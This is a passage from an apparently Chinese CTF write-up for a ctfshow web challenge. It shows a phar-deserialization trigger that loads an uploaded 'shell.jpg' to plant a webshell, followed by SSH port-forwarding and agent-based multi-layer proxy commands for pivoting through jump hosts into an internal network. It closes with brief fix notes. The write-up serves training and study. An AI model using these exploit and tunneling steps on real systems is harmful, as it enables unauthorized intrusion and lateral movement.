</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-102832.jpg width=1620 height=606 loading=lazy alt=1></p><p>触发就好了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=p>:</span><span class=mi>8085</span><span class=o>/</span><span class=n>api</span><span class=o>/</span><span class=n>index</span><span class=o>.</span><span class=n>php</span><span class=err>?</span><span class=n>a</span><span class=o>=</span><span class=n>view</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=n>phar</span><span class=p>:</span><span class=o>///</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=n>ckfinder</span><span class=o>/</span><span class=n>userfiles</span><span class=o>/</span><span class=n>images</span><span class=o>/</span><span class=n>shell</span><span class=o>.</span><span class=n>jpg</span>
</span></span></code></pre></td></tr></table></div></div><p>访问<code>/mail_cache/cache.php</code>，但是文件不能覆盖，我第一次错了，就要重开了，终于成功了</p><h2 id=ssh搭建多层代理>ssh搭建多层代理</h2><p>条件是要知道ssh的密码</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-111020.jpg width=2017 height=1147 loading=lazy alt=1></p><p>这次的环境大概就是这样，但是因为题目直接给了vps2的链接方式，所以代理的时候省了很多事情，大概就是这样子，我觉得非常麻烦的就是这个流量要一个一个进行转发，命令如下，在vps1运行命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ssh -L 9383:172.2.136.5:80 root@vps2_ip -p vps2_port
</span></span></code></pre></td></tr></table></div></div><p>这里相当于利用vps2为跳板机，把Nday1的流量转发到了可控vps1上的9383端口，在攻击机上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ssh -L 8086:127.0.0.1:9383 root@vps1_ip -p vps1_port(ssh的端口)
</span></span></code></pre></td></tr></table></div></div><p>这样子就可以把vps1的9383端口转发到攻击机的8086端口了</p><hr><p>突发奇想，并且和<strong>Base0x!?0e</strong>里面的师傅们讨论了一下，没想到也就是2024年的长城杯(广州)的环境，如图</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-132910.jpg width=2002 height=1113 loading=lazy alt=1></p><p>在vps1上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./linux_x64_agent -l 9999 -s 123
</span></span></code></pre></td></tr></table></div></div><p>在Windows本机上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>.\windows_x64_admin.exe -c vps1:9999 -s 123
</span></span><span class=line><span class=cl>use 0 
</span></span><span class=line><span class=cl>listen
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>1234
</span></span></code></pre></td></tr></table></div></div><p>在vps2上面运行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./linux_x64_agent -c vps1:1234 -s 123 --reconnect 8
</span></span></code></pre></td></tr></table></div></div><p>就搞好了</p><p><img src=/p/ctfshow-web859-with-jumpbox/QQ20250319-133011.jpg width=1732 height=926 loading=lazy alt=1></p><p>总结：<strong>先一层正向后一层反向</strong>，如果更深的话，后面的也是反向</p><h2 id=fix>fix</h2><p>有两个部分，但是第一个msf打的那个，只能升级版本了，而后台getshell的这里，我们直接选择把email也给加上过滤函数就可以了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/>内网渗透</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>